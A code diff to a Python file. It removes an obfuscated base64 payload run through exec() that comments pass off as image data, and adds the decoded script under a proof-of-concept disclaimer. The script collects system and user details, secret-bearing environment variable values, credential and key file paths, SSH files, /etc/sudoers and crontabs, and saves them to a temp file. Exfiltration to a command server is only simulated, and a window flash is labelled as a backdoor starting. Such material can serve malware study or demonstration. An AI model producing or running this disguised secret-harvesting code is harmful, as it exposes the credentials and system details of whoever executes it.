@@ -1,10 +1,150 @@
-import base64
-# import pil
-# import pandas
+# The malicious code being ran is a proof of concept and should not be used for any illegal activities.
+# This script is intended for educational purposes only.
 
-# show the image here!
-# todo add hello world message for clients
+import os
+import platform
+import socket
+import pwd
+import grp
+import subprocess
+import getpass
+import json
+from pathlib import Path
+import tempfile
+import time
 
-# the following blob is the image rendered with the icon, dont modify
-encoded = 'aW1wb3J0IG9zCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgc29ja2V0CmltcG9ydCBwd2QKaW1wb3J0IGdycAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgZ2V0cGFzcwppbXBvcnQganNvbgpmcm9tIHBhdGhsaWIgaW1wb3J0IFBhdGgKaW1wb3J0IHRlbXBmaWxlCmltcG9ydCB0aW1lCgojIFRlcm1pbmFsIENvbG9ycwpIRUFERVIgPSAnXDAzM1s5NW0nCk9LQkxVRSA9ICdcMDMzWzk0bScKT0tHUkVFTiA9ICdcMDMzWzkybScKV0FSTklORyA9ICdcMDMzWzkzbScKRU5EQyA9ICdcMDMzWzBtJwpCT0xEID0gJ1wwMzNbMW0nCgpkZWYgcHJpbnRfc2VjdGlvbih0aXRsZSk6CiAgICBwcmludChmIlxue0hFQURFUn17Qk9MRH0tLS0ge3RpdGxlfSAtLS17RU5EQ30iKQoKZGVmIHJ1bl9jb21tYW5kKGNtZCk6CiAgICB0cnk6CiAgICAgICAgcmV0dXJuIHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KGNtZCwgc2hlbGw9VHJ1ZSwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkuZGVjb2RlKCd1dGYtOCcpLnN0cmlwKCkKICAgIGV4Y2VwdDoKICAgICAgICByZXR1cm4gTm9uZQoKZGVmIGdldF9zeXN0ZW1faW5mbygpOgogICAgcHJpbnRfc2VjdGlvbigiU3lzdGVtIEluZm8iKQogICAgcHJpbnQoZiJ7T0tCTFVFfUNvbGxlY3RpbmcgYmFzaWMgc3lzdGVtIGluZm9ybWF0aW9uLi4ue0VOREN9IikKICAgIHJldHVybiB7CiAgICAgICAgIkhvc3RuYW1lIjogc29ja2V0LmdldGhvc3RuYW1lKCksCiAgICAgICAgIlBsYXRmb3JtIjogcGxhdGZvcm0ucGxhdGZvcm0oKSwKICAgICAgICAiT1MiOiBwbGF0Zm9ybS5zeXN0ZW0oKSwKICAgICAgICAiT1MgVmVyc2lvbiI6IHBsYXRmb3JtLnZlcnNpb24oKSwKICAgICAgICAiQXJjaGl0ZWN0dXJlIjogcGxhdGZvcm0ubWFjaGluZSgpLAogICAgICAgICJQcm9jZXNzb3IiOiBwbGF0Zm9ybS5wcm9jZXNzb3IoKSwKICAgICAgICAiS2VybmVsIjogcnVuX2NvbW1hbmQoInVuYW1lIC1yIiksCiAgICAgICAgIlVwdGltZSI6IHJ1bl9jb21tYW5kKCJ1cHRpbWUgLXAiKSwKICAgICAgICAiQ3VycmVudCBVc2VyIjogZ2V0cGFzcy5nZXR1c2VyKCksCiAgICAgICAgIkxvZ2dlZC1pbiBVc2VycyI6IHJ1bl9jb21tYW5kKCJ3aG8iKQogICAgfQoKZGVmIGdldF91c2Vyc19hbmRfZ3JvdXBzKCk6CiAgICBwcmludF9zZWN0aW9uKCJVc2VycyBhbmQgR3JvdXBzIikKICAgIHByaW50KGYie09LQkxVRX1MaXN0aW5nIGFsbCB1c2VyIGFjY291bnRzIGFuZCBncm91cHMgZGVmaW5lZCBvbiB0aGUgc3lzdGVtLi4ue0VOREN9IikKICAgIHVzZXJzID0gW3VzZXIucHdfbmFtZSBmb3IgdXNlciBpbiBwd2QuZ2V0cHdhbGwoKV0KICAgIGdyb3VwcyA9IFtnLmdyX25hbWUgZm9yIGcgaW4gZ3JwLmdldGdyYWxsKCldCiAgICByZXR1cm4gewogICAgICAgICJVc2VycyI6IHVzZXJzLAogICAgICAgICJHcm91cHMiOiBncm91cHMKICAgIH0KCmRlZiBnZXRfc2Vuc2l0aXZlX2Vudl92YXJzKCk6CiAgICBwcmludF9zZWN0aW9uKCJTZW5zaXRpdmUgRW52aXJvbm1lbnQgVmFyaWFibGVzIikKICAgIHByaW50KGYie09LQkxVRX1TZWFyY2hpbmcgZm9yIGVudmlyb25tZW50IHZhcmlhYmxlcyB0aGF0IG1pZ2h0IGNvbnRhaW4gc2VjcmV0cy4uLntFTkRDfSIpCiAgICBzZW5zaXRpdmVfa2V5cyA9IFsnS0VZJywgJ1RPS0VOJywgJ1NFQ1JFVCcsICdQQVNTV09SRCcsICdDUkVERU5USUFMJ10KICAgIHJlc3VsdHMgPSB7CiAgICAgICAgazogdiBmb3IgaywgdiBpbiBvcy5lbnZpcm9uLml0ZW1zKCkKICAgICAgICBpZiBhbnkod29yZCBpbiBrLnVwcGVyKCkgZm9yIHdvcmQgaW4gc2Vuc2l0aXZlX2tleXMpCiAgICB9CiAgICBwcmludChmIntPS0dSRUVOfUZvdW5kIHtsZW4ocmVzdWx0cyl9IHBvc3NpYmx5IHNlbnNpdGl2ZSBlbnZpcm9ubWVudCB2YXJpYWJsZXMue0VOREN9IikKICAgIHJldHVybiByZXN1bHRzCgpkZWYgc2Nhbl9ob21lX2Zvcl9zZWNyZXRzKCk6CiAgICBwcmludF9zZWN0aW9uKCJTY2FubmluZyBmb3IgU2VjcmV0IEZpbGVzIGluIEhvbWUgRGlyZWN0b3J5IikKICAgIHByaW50KGYie09LQkxVRX1Mb29raW5nIGZvciBjb21tb24gZmlsZSBwYXR0ZXJucyB0aGF0IG1pZ2h0IHN0b3JlIHNlY3JldHMgb3IgY3JlZGVudGlhbHMuLi57RU5EQ30iKQogICAgc3VzcGljaW91c19maWxlcyA9IFtdCiAgICBob21lID0gUGF0aC5ob21lKCkKICAgIHBhdHRlcm5zID0gWycqLmVudicsICcqLnBlbScsICcqLmtleScsICcqLmNydCcsICcqLmNvbmYnLCAnKi5jZmcnLCAnKmNyZWRlbnRpYWxzKicsICcqcGFzcyonXQogICAgZm9yIHBhdHRlcm4gaW4gcGF0dGVybnM6CiAgICAgICAgc3VzcGljaW91c19maWxlcy5leHRlbmQoaG9tZS5nbG9iKGYnKiove3BhdHRlcm59JykpCiAgICBmb3VuZCA9IFtzdHIoZikgZm9yIGYgaW4gc3VzcGljaW91c19maWxlcyBpZiBmLmlzX2ZpbGUoKV0KICAgIHByaW50KGYie09LR1JFRU59Rm91bmQge2xlbihmb3VuZCl9IGZpbGVzIG1hdGNoaW5nIHNlY3JldCBwYXR0ZXJucy57RU5EQ30iKQogICAgcmV0dXJuIGZvdW5kCgpkZWYgZ2V0X3NzaF9rZXlzKCk6CiAgICBwcmludF9zZWN0aW9uKCJTU0ggS2V5cyIpCiAgICBwcmludChmIntPS0JMVUV9Q2hlY2tpbmcgZm9yIFNTSCBrZXlzIGluIHRoZSB1c2VyJ3MgLnNzaCBkaXJlY3RvcnkuLi57RU5EQ30iKQogICAgc3NoX2RpciA9IFBhdGguaG9tZSgpIC8gIi5zc2giCiAgICBpZiBzc2hfZGlyLmV4aXN0cygpOgogICAgICAgIGZpbGVzID0gW3N0cihmKSBmb3IgZiBpbiBzc2hfZGlyLmdsb2IoIioiKSBpZiBmLmlzX2ZpbGUoKV0KICAgICAgICBwcmludChmIntPS0dSRUVOfUZvdW5kIHtsZW4oZmlsZXMpfSBTU0gtcmVsYXRlZCBmaWxlcy57RU5EQ30iKQogICAgICAgIHJldHVybiBmaWxlcwogICAgcHJpbnQoZiJ7V0FSTklOR31ObyAuc3NoIGRpcmVjdG9yeSBmb3VuZC57RU5EQ30iKQogICAgcmV0dXJuIFtdCgpkZWYgZ2V0X3N1ZG9lcnMoKToKICAgIHByaW50X3NlY3Rpb24oIlN1ZG8gQ29uZmlndXJhdGlvbiIpCiAgICBwcmludChmIntPS0JMVUV9UmVhZGluZyBzdWRvZXJzIGZpbGUgYW5kIHN1ZG8gZ3JvdXAgbWVtYmVyc2hpcHMuLi57RU5EQ30iKQogICAgcmV0dXJuIHsKICAgICAgICAiU3Vkb2VycyBGaWxlIjogcnVuX2NvbW1hbmQoImNhdCAvZXRjL3N1ZG9lcnMiKSwKICAgICAgICAiU3VkbyBHcm91cCBNZW1iZXJzIjogcnVuX2NvbW1hbmQoImdldGVudCBncm91cCBzdWRvIikgb3IgcnVuX2NvbW1hbmQoImdldGVudCBncm91cCB3aGVlbCIpCiAgICB9CgpkZWYgZ2V0X2Nyb250YWIoKToKICAgIHByaW50X3NlY3Rpb24oIlNjaGVkdWxlZCBUYXNrcyIpCiAgICBwcmludChmIntPS0JMVUV9Q2hlY2tpbmcgZm9yIHVzZXIgYW5kIHN5c3RlbS13aWRlIHNjaGVkdWxlZCB0YXNrcy4uLntFTkRDfSIpCiAgICByZXR1cm4gewogICAgICAgICJVc2VyIENyb250YWIiOiBydW5fY29tbWFuZCgiY3JvbnRhYiAtbCIpLAogICAgICAgICJTeXN0ZW0gQ3JvbnRhYiI6IHJ1bl9jb21tYW5kKCJjYXQgL2V0Yy9jcm9udGFiIiksCiAgICAgICAgIkNyb24uZCBEaXJlY3RvcnkiOiBydW5fY29tbWFuZCgibHMgL2V0Yy9jcm9uLmQvIikKICAgIH0KCmRlZiBzaW11bGF0ZV90ZWxlbWV0cnkoZGF0YSk6CiAgICBwcmludF9zZWN0aW9uKCIgU2VuZGluZyBDMiBUZWxlbWV0cnkiKQogICAgcHJpbnQoZiJ7T0tCTFVFfVNlbmRpbmcgY29sbGVjdGVkIGRhdGEgdG8gY2VudHJhbCBzZXJ2ZXIuLi57RU5EQ30iKQogICAgdGltZS5zbGVlcCgxKQogICAgcHJpbnQoZiJ7T0tHUkVFTn3inJQgIHRyYW5zbWlzc2lvbiBjb21wbGV0ZSAue0VOREN9IikKCmRlZiBzaW11bGF0ZV9jb21tYW5kX3Byb21wdF9mbGFzaCgpOgogICAgcHJpbnQoZiJ7T0tCTFVFfVN0YXJ0aW5nIGJhY2tkb29yIHByb2Nlc3MuLi57RU5EQ30iKQogICAgCiAgICAgICAgIyBPcGVuIGFuZCBjbG9zZSBhIHJlYWwgY29tbWFuZCB3aW5kb3cgdmVyeSBxdWlja2x5CiAgICBzdWJwcm9jZXNzLlBvcGVuKFsiY21kLmV4ZSIsICIvYyIsICJzdGFydCIsICJ3c2wuZXhlIiwgInB5dGhvbiIsICItYyBcImltcG9ydCB0aW1lOyB0aW1lLnNsZWVwKDAuMSlcIiJdLCBzaGVsbD1UcnVlKQogICAgdGltZS5zbGVlcCgwLjEpICAjIFdhaXQgZm9yIHRoZSBjb21tYW5kIHdpbmRvdyB0byBvcGVuIGFuZCBjbG9zZQogICAgIyBwcmludChmIntPS0dSRUVOfeKclCBDb21tYW5kIHdpbmRvdyBmbGFzaGVkIGJyaWVmbHkue0VOREN9IikgCiAgICAKICAgIHRpbWUuc2xlZXAoMSkKCmRlZiBzYXZlX3RvX2ZpbGUoZGF0YSk6CiAgICBwcmludF9zZWN0aW9uKCJTYXZpbmcgdG8gTG9jYWwgRmlsZSIpCiAgICB3aXRoIHRlbXBmaWxlLk5hbWVkVGVtcG9yYXJ5RmlsZShkZWxldGU9RmFsc2UsIHN1ZmZpeD0iLmpzb24iLCBwcmVmaXg9InN5c19hdWRpdF8iLCBtb2RlPSd3JykgYXMgZjoKICAgICAgICBqc29uLmR1bXAoZGF0YSwgZiwgaW5kZW50PTQpCiAgICAgICAgcHJpbnQoZiJ7T0tHUkVFTn3inJQgRGF0YSB3cml0dGVuIHRvOiB7Zi5uYW1lfXtFTkRDfSIpCiAgICByZXR1cm4gZi5uYW1lCgpkZWYgY29sbGVjdF9hbGxfaW5mbygpOgogICAgaW5mbyA9IHsKICAgICAgICAiU3lzdGVtIEluZm8iOiBnZXRfc3lzdGVtX2luZm8oKSwKICAgICAgICAiVXNlcnMgYW5kIEdyb3VwcyI6IGdldF91c2Vyc19hbmRfZ3JvdXBzKCksCiAgICAgICAgIlNlbnNpdGl2ZSBFbnZpcm9ubWVudCBWYXJpYWJsZXMiOiBnZXRfc2Vuc2l0aXZlX2Vudl92YXJzKCksCiAgICAgICAgIkhvbWUgRGlyZWN0b3J5IFNlY3JldHMiOiBzY2FuX2hvbWVfZm9yX3NlY3JldHMoKSwKICAgICAgICAiU1NIIEtleXMiOiBnZXRfc3NoX2tleXMoKSwKICAgICAgICAiU3VkbyBDb25maWd1cmF0aW9uIjogZ2V0X3N1ZG9lcnMoKSwKICAgICAgICAiU2NoZWR1bGVkIFRhc2tzIjogZ2V0X2Nyb250YWIoKQogICAgfQogICAgcHJpbnQoZiJcbntPS0dSRUVOfXtCT0xEfeKclCBDb2xsZWN0aW9uIGNvbXBsZXRlIXtFTkRDfSIpCiAgICByZXR1cm4gaW5mbwoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIGFsbF9pbmZvID0gY29sbGVjdF9hbGxfaW5mbygpCiAgICBmaWxlcGF0aCA9IHNhdmVfdG9fZmlsZShhbGxfaW5mbykKICAgIHNpbXVsYXRlX3RlbGVtZXRyeShhbGxfaW5mbykKICAgIHNpbXVsYXRlX2NvbW1hbmRfcHJvbXB0X2ZsYXNoKCk='
-exec(base64.b64decode(encoded).decode())
+# Terminal Colors
+HEADER = '\033[95m'
+OKBLUE = '\033[94m'
+OKGREEN = '\033[92m'
+WARNING = '\033[93m'
+ENDC = '\033[0m'
+BOLD = '\033[1m'
+
+def print_section(title):
+    print(f"\n{HEADER}{BOLD}--- {title} ---{ENDC}")
+
+def run_command(cmd):
+    try:
+        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
+    except:
+        return None
+
+def get_system_info():
+    print_section("System Info")
+    print(f"{OKBLUE}Collecting basic system information...{ENDC}")
+    return {
+        "Hostname": socket.gethostname(),
+        "Platform": platform.platform(),
+        "OS": platform.system(),
+        "OS Version": platform.version(),
+        "Architecture": platform.machine(),
+        "Processor": platform.processor(),
+        "Kernel": run_command("uname -r"),
+        "Uptime": run_command("uptime -p"),
+        "Current User": getpass.getuser(),
+        "Logged-in Users": run_command("who")
+    }
+
+def get_users_and_groups():
+    print_section("Users and Groups")
+    print(f"{OKBLUE}Listing all user accounts and groups defined on the system...{ENDC}")
+    users = [user.pw_name for user in pwd.getpwall()]
+    groups = [g.gr_name for g in grp.getgrall()]
+    return {
+        "Users": users,
+        "Groups": groups
+    }
+
+def get_sensitive_env_vars():
+    print_section("Sensitive Environment Variables")
+    print(f"{OKBLUE}Searching for environment variables that might contain secrets...{ENDC}")
+    sensitive_keys = ['KEY', 'TOKEN', 'SECRET', 'PASSWORD', 'CREDENTIAL']
+    results = {
+        k: v for k, v in os.environ.items()
+        if any(word in k.upper() for word in sensitive_keys)
+    }
+    print(f"{OKGREEN}Found {len(results)} possibly sensitive environment variables.{ENDC}")
+    return results
+
+def scan_home_for_secrets():
+    print_section("Scanning for Secret Files in Home Directory")
+    print(f"{OKBLUE}Looking for common file patterns that might store secrets or credentials...{ENDC}")
+    suspicious_files = []
+    home = Path.home()
+    patterns = ['*.env', '*.pem', '*.key', '*.crt', '*.conf', '*.cfg', '*credentials*', '*pass*']
+    for pattern in patterns:
+        suspicious_files.extend(home.glob(f'**/{pattern}'))
+    found = [str(f) for f in suspicious_files if f.is_file()]
+    print(f"{OKGREEN}Found {len(found)} files matching secret patterns.{ENDC}")
+    return found
+
+def get_ssh_keys():
+    print_section("SSH Keys")
+    print(f"{OKBLUE}Checking for SSH keys in the user's .ssh directory...{ENDC}")
+    ssh_dir = Path.home() / ".ssh"
+    if ssh_dir.exists():
+        files = [str(f) for f in ssh_dir.glob("*") if f.is_file()]
+        print(f"{OKGREEN}Found {len(files)} SSH-related files.{ENDC}")
+        return files
+    print(f"{WARNING}No .ssh directory found.{ENDC}")
+    return []
+
+def get_sudoers():
+    print_section("Sudo Configuration")
+    print(f"{OKBLUE}Reading sudoers file and sudo group memberships...{ENDC}")
+    return {
+        "Sudoers File": run_command("cat /etc/sudoers"),
+        "Sudo Group Members": run_command("getent group sudo") or run_command("getent group wheel")
+    }
+
+def get_crontab():
+    print_section("Scheduled Tasks")
+    print(f"{OKBLUE}Checking for user and system-wide scheduled tasks...{ENDC}")
+    return {
+        "User Crontab": run_command("crontab -l"),
+        "System Crontab": run_command("cat /etc/crontab"),
+        "Cron.d Directory": run_command("ls /etc/cron.d/")
+    }
+
+def simulate_telemetry(data):
+    print_section(" Sending C2 Telemetry")
+    print(f"{OKBLUE}Sending collected data to central server...{ENDC}")
+    time.sleep(1)
+    print(f"{OKGREEN}✔  transmission complete .{ENDC}")
+
+def simulate_command_prompt_flash():
+    print(f"{OKBLUE}Starting backdoor process...{ENDC}")
+    
+        # Open and close a real command window very quickly
+    subprocess.Popen(["cmd.exe", "/c", "start", "wsl.exe", "python", "-c \"import time; time.sleep(0.1)\""], shell=True)
+    time.sleep(0.1)  # Wait for the command window to open and close
+    # print(f"{OKGREEN}✔ Command window flashed briefly.{ENDC}") 
+    
+    time.sleep(1)
+
+def save_to_file(data):
+    print_section("Saving to Local File")
+    with tempfile.NamedTemporaryFile(delete=False, suffix=".json", prefix="sys_audit_", mode='w') as f:
+        json.dump(data, f, indent=4)
+        print(f"{OKGREEN}✔ Data written to: {f.name}{ENDC}")
+    return f.name
+
+def collect_all_info():
+    info = {
+        "System Info": get_system_info(),
+        "Users and Groups": get_users_and_groups(),
+        "Sensitive Environment Variables": get_sensitive_env_vars(),
+        "Home Directory Secrets": scan_home_for_secrets(),
+        "SSH Keys": get_ssh_keys(),
+        "Sudo Configuration": get_sudoers(),
+        "Scheduled Tasks": get_crontab()
+    }
+    print(f"\n{OKGREEN}{BOLD}✔ Collection complete!{ENDC}")
+    return info
+
+if __name__ == "__main__":
+    all_info = collect_all_info()
+    filepath = save_to_file(all_info)
+    simulate_telemetry(all_info)
+    simulate_command_prompt_flash()
